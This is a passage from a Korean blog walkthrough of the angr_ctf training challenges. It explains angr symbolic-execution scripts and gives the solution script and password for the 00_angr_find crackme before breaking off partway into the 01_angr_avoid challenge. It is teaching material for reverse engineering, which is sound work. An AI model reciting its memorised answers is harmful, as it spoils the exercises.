&#xC9C4;&#xD589;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. dist &#xD3F4;&#xB354;&#xC5D0;&#xB294; &#xBBF8;&#xB9AC; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; &#xBB38;&#xC81C;&#xC6A9; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xAC01;&#xAC01; &#xBC88;&#xD638;&#xB85C; &#xB9E4;&#xCE6D;&#xC774; &#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBB38;&#xC81C;&#xB9C8;&#xB2E4; &#xBC88;&#xD638;&#xC5D0; &#xB9DE;&#xB294; &#xD30C;&#xC774;&#xC36C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC5F4;&#xC5B4;&#xBCF4;&#xC2DC;&#xBA74; &#xC124;&#xBA85;&#xACFC; &#xD568;&#xAED8; &#xBB38;&#xC81C;&#xD480;&#xC774;&#xB97C; &#xC704;&#xD55C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC2A4;&#xD2B8;&#xB9BD;&#xD2B8;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xC800;&#xD76C;&#xAC00; &#xD560;&#xC77C;&#xC740; &#xADF8; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB4E4; &#xC548;&#xC5D0; &#xC9C0;&#xC6CC;&#xC838; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xB4E4;&#xC744; &#xCC44;&#xC6CC;&#xAC00;&#xBA74; &#xB418;&#xB294;&#xAC70;&#xC8E0;!</p><h1 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h1><p>0 &#xBC88;&#xC9F8; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;! &#xBC14;&#xB85C; IDA&#xB85C; &#xAE4C;&#xBCF4;&#xC8E0;.</p><p><img src="/2021/08/04/j0ker/angr_part3/Untitled.png" alt="anrgr_part3/Untitled.png"></p><p>&#xD638;&#xD638; &#xBCC4;&#xAC70; &#xC5C6;&#xB124;&#xC694;. &#xB300;&#xCDA9; &#xBCF4;&#xBA74; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC785;&#xB825;&#xC73C;&#xB85C; 8&#xAE00;&#xC790;&#xB97C; &#xBC1B;&#xACE0; <code>complex_function</code>&#xC774;&#xB77C;&#xB294; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xCFF5;&#xC800;&#xB7EC;&#xCFF5; &#xC791;&#xC5C5;&#xC744; &#xD55C; &#xB2E4;&#xC74C;&#xC5D0;, &#x201C;JACEJGCS&#x201D; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xBE44;&#xAD50;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; <code>complex_function</code>&#xC774; &#xBB58; &#xD558;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/1.png" alt="anrgr_part3/Untitled%201.png"></p><p>&#xC5EC;&#xAE30;&#xC11C;&#xB3C4; &#xBCC4;&#xAC8C; &#xC5C6;&#xB124;&#xC694;! &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xB450; &#xAC12;&#xC73C;&#xB85C; &#xC5F0;&#xC0B0;&#xC744; &#xD558;&#xACE0; &#xB05D;&#xB0A9;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xC774;&#xAC70;&#xB294; &#xC5B4;&#xCC28;&#xD53C; angr&#xAC00; &#xC54C;&#xC544;&#xC11C; &#xBD84;&#xC11D;&#xD574;&#xC904;&#xD14C;&#xB2C8;&#xAE4C; &#xADF8;&#xB0E5; &#xB118;&#xC5B4;&#xAC11;&#xC2DC;&#xB2E4;!(&#xB315;&#xAFC0;)</p><p>&#xADF8;&#xB7EC;&#xBA74; &#xC774;&#xBC88;&#xC5D0;&#xB294; scaffold00.py&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4;&#xBCFC;&#xAC8C;&#xC694;.</p><pre><code class="hljs python"><span class="hljs-comment"># Before you begin, here are a few notes about these capture-the-flag</span><span class="hljs-comment"># challenges.</span><span class="hljs-comment">#</span><span class="hljs-comment"># Each binary, when run, will ask for a password, which can be entered via stdin</span><span class="hljs-comment"># (typing it into the console.) Many of the levels will accept many different</span><span class="hljs-comment"># passwords. Your goal is to find a single password that works for each binary.</span><span class="hljs-comment">#</span><span class="hljs-comment"># If you enter an incorrect password, the program will print &quot;Try again.&quot; If you</span><span class="hljs-comment"># enter a correct password, the program will print &quot;Good Job.&quot;</span><span class="hljs-comment">#</span><span class="hljs-comment"># Each challenge will be accompanied by a file like this one, named</span><span class="hljs-comment"># &quot;scaffoldXX.py&quot;. It will offer guidance as well as the skeleton of a possible</span><span class="hljs-comment"># solution. You will have to edit each file. In some cases, you will have to</span><span class="hljs-comment"># edit it significantly. While use of these files is recommended, you can write</span><span class="hljs-comment"># a solution without them, if you find that they are too restrictive.</span><span class="hljs-comment">#</span><span class="hljs-comment"># Places in the scaffoldXX.py that require a simple substitution will be marked</span><span class="hljs-comment"># with three question marks (???). Places that require more code will be marked</span><span class="hljs-comment"># with an ellipsis (...). Comments will document any new concepts, but will be</span><span class="hljs-comment"># omitted for concepts that have already been covered (you will need to use</span><span class="hljs-comment"># previous scaffoldXX.py files as a reference to solve the challenges.) If a</span><span class="hljs-comment"># comment documents a part of the code that needs to be changed, it will be</span><span class="hljs-comment"># marked with an exclamation point at the end, on a separate line (!).</span><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  <span class="hljs-comment"># Create an Angr project.</span>  <span class="hljs-comment"># If you want to be able to point to the binary from the command line, you can</span>  <span class="hljs-comment"># use argv[1] as the parameter. Then, you can run the script from the command</span>  <span class="hljs-comment"># line as follows:</span>  <span class="hljs-comment"># python ./scaffold00.py [binary]</span>  <span class="hljs-comment"># (!)</span>  path_to_binary = ???  # :string  project = angr.Project(path_to_binary)  <span class="hljs-comment"># Tell Angr where to start executing (should it start from the main()</span>  <span class="hljs-comment"># function or somewhere else?) For now, use the entry_state function</span>  <span class="hljs-comment"># to instruct Angr to start from the main() function.</span>  initial_state = project.factory.entry_state()  <span class="hljs-comment"># Create a simulation manager initialized with the starting state. It provides</span>  <span class="hljs-comment"># a number of useful tools to search and execute the binary.</span>  simulation = project.factory.simgr(initial_state)  <span class="hljs-comment"># Explore the binary to attempt to find the address that prints &quot;Good Job.&quot;</span>  <span class="hljs-comment"># You will have to find the address you want to find and insert it here. </span>  <span class="hljs-comment"># This function will keep executing until it either finds a solution or it </span>  <span class="hljs-comment"># has explored every possible path through the executable.</span>  <span class="hljs-comment"># (!)</span>  print_good_address = ???  # :integer (probably in hexadecimal)  simulation.explore(find=print_good_address)  <span class="hljs-comment"># Check that we have found a solution. The simulation.explore() method will</span>  <span class="hljs-comment"># set simulation.found to a list of the states that it could find that reach</span>  <span class="hljs-comment"># the instruction we asked it to search for. Remember, in Python, if a list</span>  <span class="hljs-comment"># is empty, it will be evaluated as false, otherwise true.</span>  <span class="hljs-keyword">if</span> simulation.found:    <span class="hljs-comment"># The explore method stops after it finds a single state that arrives at the</span>    <span class="hljs-comment"># target address.</span>    solution_state = simulation.found[<span class="hljs-number">0</span>]&#xADF8;&#xB7EC;&#xBA70;    <span class="hljs-comment"># Print the string that Angr wrote to stdin to follow solution_state. This </span>    <span class="hljs-comment"># is our solution.</span>    <span class="hljs-keyword">print</span> solution_state.posix.dumps(sys.stdin.fileno())  <span class="hljs-keyword">else</span>:    <span class="hljs-comment"># If Angr could not find a path that reaches print_good_address, throw an</span>    <span class="hljs-comment"># error. Perhaps you mistyped the print_good_address?</span>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xC73C;&#xC73D;&#x2026; &#xC601;&#xC5B4;&#xAC00; &#xB9CE;&#xC740; &#xAC74; &#xC88B;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD55C;&#xAD6D;&#xC5B4;&#xB3C4; &#xC798; &#xBABB;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xD55C;&#xD14C; &#xC601;&#xC5B4;&#xB77C;&#xB2C8;&#x2026; &#xAC00;&#xB2F9;&#xCE58;&#xB3C4; &#xC54A;&#xC8E0;. &#xC77C;&#xB2E8; &#xC124;&#xBA85;&#xC740; &#xB2E4; &#xC5C6;&#xC560;&#xACE0; &#xC77C;&#xC77C;&#xC774; &#xBCF4;&#xBA74;&#xC11C; &#xC81C;&#xAC00; &#xC124;&#xBA85;&#xD574;&#xB4DC;&#xB9AC;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = ???  # :string  project = angr.Project(path_to_binary)    initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  print_good_address = ???  # :integer (probably in hexadecimal)  simulation.explore(find=print_good_address)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    <span class="hljs-keyword">print</span> solution_state.posix.dumps(sys.stdin.fileno())  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xD558;&#x2026; &#xD3B8;-&#xC548;&#x2026;</p><p>&#xC77C;&#xB2E8; &#xBCF4;&#xBA74; ???&#xB77C;&#xACE0; &#xB418;&#xC5B4; &#xC788;&#xB294; &#xACF3;&#xC774; &#xB450; &#xAD70;&#xB370; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xC800; &#xBD80;&#xBD84;&#xB9CC; &#xC800;&#xD76C;&#xAC00; &#xB530;&#xB85C; &#xC791;&#xC131;&#xC744; &#xD574;&#xC8FC;&#xBA74; &#xD480; &#xC218; &#xC788;&#xC744;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">path_to_binary = ???  # :stringproject = angr.Project(path_to_binary)</code></pre><p>&#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800; angr&#xB97C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xC758;&#xBBF8;&#xB85C; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xC5B4;&#xB5A4; &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xAC83;&#xC778;&#xC9C0; &#xC9C0;&#xC815;&#xC744; &#xD574;&#xC918;&#xC57C;&#xACA0;&#xC8E0;? &#xD558;&#xC9C0;&#xB9CC; &#xB9E4;&#xBC88; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0; &#xBB38;&#xC81C; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xC801;&#xC5B4;&#xC8FC;&#xB294;&#xAC74; &#xADC0;&#xCC2E;&#xC73C;&#xB2C8; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC544; &#xC4F0;&#xB294; &#xAC78;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. <code>path_to_binary = argv[1]</code></p><pre><code class="hljs python">initial_state = project.factory.entry_state()simulation = project.factory.simgr(initial_state)</code></pre><p>&#xC774;&#xC81C; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xC791;&#xD560; &#xBD80;&#xBD84;&#xC744; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xD2B9;&#xBCC4;&#xD55C; &#xC870;&#xAC74;&#xC774; &#xC5C6;&#xC73C;&#xB2C8; &#xADF8;&#xB0E5; &#xC5D4;&#xD2B8;&#xB9AC;&#xD3EC;&#xC778;&#xD2B8;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xC744; &#xD558;&#xB294;&#xAC8C; &#xC88B;&#xACA0;&#xC8E0;? <code>project.factory.entry_state()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC5D4;&#xD2B8;&#xB9AC;&#xD3EC;&#xC778;&#xD2B8;&#xBD80;&#xD130; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xD560; &#xC218; &#xC788;&#xAC8C; state &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; <code>full_init_state()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC5D4;&#xD2B8;&#xB9AC;&#xD3EC;&#xC778;&#xD2B8; &#xC774;&#xC804;&#xC5D0; &#xB85C;&#xB354;&#xC5D0;&#xC11C; &#xD558;&#xB294; &#xC791;&#xC5C5;&#xB4E4;, &#xCD08;&#xAE30;&#xD654; &#xD568;&#xC218;&#xB4E4;&#xAE4C;&#xC9C0; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD560; &#xC218; &#xC788;&#xB294; state&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xAE30;&#xB3C4; &#xD558;&#xACE0; <code>blank_state()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC720;&#xC800;&#xAC00; &#xB9C8;&#xC74C;&#xB300;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; state, <code>call_state()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC9C0;&#xC815;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD560; &#xC218; &#xC788;&#xB294; state&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xAC70;&#xB294; &#xBB38;&#xC81C; &#xC0C1;&#xD669;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB974;&#xAC8C; &#xC124;&#xC815;&#xD558;&#xBA74; &#xB420;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>state&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xBA74; &#xC774;&#xAC78; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xC5D0; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB294; &#x201C;&#xC544; &#xC774; state&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC744; &#xC900;&#xBE44;&#xD558;&#xBA74; &#xB418;&#xACA0;&#xAD6C;&#xB098;&#x201D;&#xD558;&#xACE0; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC704;&#xD55C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xB610; &#xC0DD;&#xC131;&#xD558;&#xC8E0;.</p><pre><code class="hljs python">print_good_address = ???  # :integer (probably in hexadecimal)simulation.explore(find=print_good_address)</code></pre><p>&#xC774;&#xC81C; &#xB3C4;&#xB2EC;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xC8FC;&#xC18C;&#xB97C; &#xC124;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. <code>explore()</code>&#xC5D0;&#xC11C;&#xB294; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xC870;&#xAC74;&#xC5D0; &#xB530;&#xB77C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xACE0; &#xC870;&#xAC74;&#xC5D0; &#xBD80;&#xD569;&#xD558;&#xAC70;&#xB098; &#xBD80;&#xD569;&#xD558;&#xC9C0; &#xC54A;&#xB294; state&#xB97C; &#xCC3E;&#xC544;&#xB0B4;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC778;&#xC790;&#xB85C; &#xC8FC;&#xC18C;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB85C; &#xAC00;&#xB294; state&#xB97C; &#xCC3E;&#xAC70;&#xB098; &#xD53C;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xC8FC;&#xC18C;&#xAC00; &#xC788;&#xB2E4;&#xBA74; &#xADF8; &#xC8FC;&#xC18C;&#xB97C; &#xD53C;&#xD574; state&#xB97C; &#xD0D0;&#xC0C9;&#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xB294; &#x201C;Good Job&#x201D;&#xC744; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294; &#xC8FC;&#xC18C;&#xAE4C;&#xC9C0; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xC785;&#xB825;&#xAC12;&#xC744; &#xCC3E;&#xC544;&#xC57C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; find &#xC778;&#xC790; &#xAC12;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; &#xB118;&#xACA8;&#xC8FC;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC2DC; IDA&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xC11C; &#xBCF4;&#xBA74; &#x201C;Good Job&#x201D;&#xC744; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294; &#xBD80;&#xBD84;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/2.png" alt="./angr_part3/Untitled%202.png"></p><p>&#xBB50; &#xC774; &#xBD80;&#xBD84;&#xC740; &#xC5B4;&#xB514;&#xB4E0; &#xC124;&#xC815;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xC8E0;. &#xC800;&#xB294; <code>puts</code>&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; <code>0x0804867d</code>&#xB85C; &#xC124;&#xC815;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">if</span> simulation.found:  solution_state = simulation.found[<span class="hljs-number">0</span>]  print(solution_state.posix.dumps(sys.stdin.fileno()))<span class="hljs-keyword">else</span>:  <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)</code></pre><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xC6D0;&#xD558;&#xB294; state&#xB97C; &#xCC3E;&#xC558;&#xC744; &#xB54C; &#xCD9C;&#xB825;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; <code>found</code>&#xB77C;&#xB294; &#xB9F4;&#xBC84;&#xC758; &#xD0C0;&#xC785;&#xC774; &#xAD81;&#xAE08;&#xD574;&#xC11C; &#xCC3E;&#xC544;&#xBD24;&#xB294;&#xB370;, angr &#xACF5;&#xC2DD; &#xBB38;&#xC11C;&#xC5D0;&#xB294; &#xC5C6;&#xB354;&#xB77C;&#xAD6C;&#xC694;??!?! <code>angr.state_plugins.posix.SimSystemPosix</code> &#xD074;&#xB798;&#xC2A4;&#xC5D0; dumps&#xB77C;&#xB294; &#xBA54;&#xC18C;&#xB4DC;&#xAC00; &#xC788;&#xC5B4;&#xC11C; &#xADF8;&#xB7FC; <code>solution_state</code>&#xAC00; <code>state_plugins</code> &#xBAA8;&#xB4C8;&#xC774;&#xACE0; &#xC774;&#xAC70;&#xB97C; &#xBA64;&#xBC84;&#xB85C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xD074;&#xB798;&#xC2A4;&#xAC00; &#xC788;&#xB098; &#xD558;&#xB2E4;&#xAC00; &#xADF8;&#xB9CC;&#xB450;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xB108;&#xBB34; &#xBC29;&#xB300;&#xD558;&#xB354;&#xAD70;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xC774;&#xAC83;&#xC800;&#xAC83; &#xCC3E;&#xC544;&#xBCF4;&#xB2E4;&#xAC00; &#xC77C;&#xB2E8; &#xC774;&#xAC70;&#xB294; &#xC774;&#xB807;&#xAC8C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4; &#xC815;&#xB3C4;&#xB85C;&#xB9CC; &#xC774;&#xD574;&#xD558;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC;!!! 0&#xBC88; &#xBB38;&#xC81C; &#xD074;&#xB9AC;&#xC5B4;!!</p><h2 id="sol00-py"><a href="#sol00-py" class="headerlink" title="sol00.py"></a>sol00.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  print_good_address = <span class="hljs-number">0x0804867d</span>  simulation.explore(find=print_good_address)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    print(solution_state.posix.dumps(sys.stdin.fileno()))  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 ./sol00.py ./<span class="hljs-number">00</span>_angr_findWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">295</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80486b1</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>_angr_find (<span class="hljs-number">0x80486b1</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">36</span>,<span class="hljs-number">297</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x80486b3</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>_angr_find (<span class="hljs-number">0x80486b3</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-04</span> <span class="hljs-number">06</span>:<span class="hljs-number">41</span>:<span class="hljs-number">37</span>,<span class="hljs-number">976</span> | angr.storage.memory_mixins.default_filler_mixin | Filling memory at <span class="hljs-number">0x7ffeff60</span> <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8189f50</span> (strcmp+<span class="hljs-number">0x0</span> <span class="hljs-keyword">in</span> libc.so<span class="hljs-number">.6</span> (<span class="hljs-number">0x89f50</span>))[&lt;SimState @ <span class="hljs-number">0x804867d</span>&gt;]<span class="hljs-string">b&apos;JXWVXRKX&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">00</span>_angr_findEnter the password: JXWVXRKXGood Job.</code></pre><h1 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h1><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; avoid&#xC5D0; &#xAD00;&#xB828;&#xB41C; &#xBB38;&#xC81C; &#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xAE4C; &#xC704;&#xC5D0;&#xC11C;&#xB3C4; <code>explore()</code>&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xB97C; &#xCC3E;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC; &#xD53C;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xACE0; &#xB9D0;&#xC500;&#xB4DC;&#xB838;&#xC8E0;? &#xADF8;&#xAC70;&#xC5D0; &#xAD00;&#xD55C; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADFC;&#xB370; IDA&#xC5D0; &#xB123;&#xC5B4;&#xBD24;&#xB354;&#xB2C8; &#xD5E5;&#xC2A4;&#xB808;&#xC774;&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xB124;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xD568;&#xC218; &#xBAA9;&#xB85D;&#xC744; &#xBD24;&#xB354;&#xB2C8; <code>avoid_me</code>&#xB77C;&#xB294; &#xD568;&#xC218;&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/3.png" alt="./anrgr_part3/Untitled%203.png"></p><p>&#xC0AC;&#xC2E4; &#xC548;&#xC5D0;&#xB294; &#xB0B4;&#xC6A9;&#xC774; &#xBCC4;&#xB85C; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. <code>should_succeed</code>&#xB77C;&#xB294; &#xC804;&#xC5ED; &#xBCC0;&#xC218;&#xC5D0; 0&#xC73C;&#xB85C; 